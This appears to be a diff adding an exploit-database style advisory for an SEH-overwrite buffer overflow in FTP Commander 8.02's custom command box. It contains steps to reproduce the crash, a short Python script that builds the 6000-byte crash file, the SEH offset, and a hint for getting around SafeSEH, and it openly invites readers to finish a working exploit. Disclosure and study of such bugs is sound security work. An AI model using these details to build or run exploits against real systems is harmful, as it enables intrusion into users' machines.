@@ -1,0 +1,30 @@
+********************************************************************************************
+# Exploit Title: FTP Commander 'Costum Command' SEH Over-Write(Buffer Overflow).
+# Date: 8/17/2015
+# Exploit Author: Un_N0n
+# Software Vendor : http://www.internet-soft.com/
+# Software Link: http://www.internet-soft.com/ftpcomm.htm
+# Version: 8.02
+# Tested on: Windows 7 x32(32 BIT)
+********************************************************************************************
+
+[Steps to Produce the Crash]:
+1- open 'ftpcomm.exe'.
+2- Goto FTP - Server > Costum Command.
+3- Below the SERVER LIST a input-box will appear, enter the contents of the crash.txt into it, then press Do it!.
+4- Software will crash saying 'Access Violation at address XXXXXXXX......'.
+
+This is basic SEH Over-write, i have tried to make a working exploit on WIN 7 x32 but no luck since this-
+program does not have its own DLLs and using Windows DLLs is not a good idea b/c SAFESEH, have tried
+other techniques but the final exploit seems to be un-stable.
+
+[Code to produce crash.txt]: 
+junk = "A"*6000
+file = open("crash.txt",'w')
+file.write(junk)
+file.close()
+
+The following details are for those who would like to develop a working exploit for this software:
+OFFSET: 4112 + BBBB[NSEH] + CCCC[SEH] ...
+Hint: ~You can try loading the address from outside the address range of loaded modules.~ ;)
+*****************************************************************************************************************************
